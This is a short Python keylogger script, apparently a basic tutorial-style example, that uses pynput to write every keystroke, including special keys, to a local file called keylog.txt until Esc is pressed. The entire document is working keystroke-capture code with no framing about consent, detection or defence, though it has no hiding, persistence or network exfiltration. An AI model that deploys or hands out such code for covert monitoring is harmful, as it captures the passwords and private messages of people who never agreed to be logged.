from pynput import keyboard

# Log file to store keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # Record regular keys
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")  # Record special keys like Shift or Enter

def on_release(key):
    if key == keyboard.Key.esc:  # Stop the program when 'Esc' is pressed
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
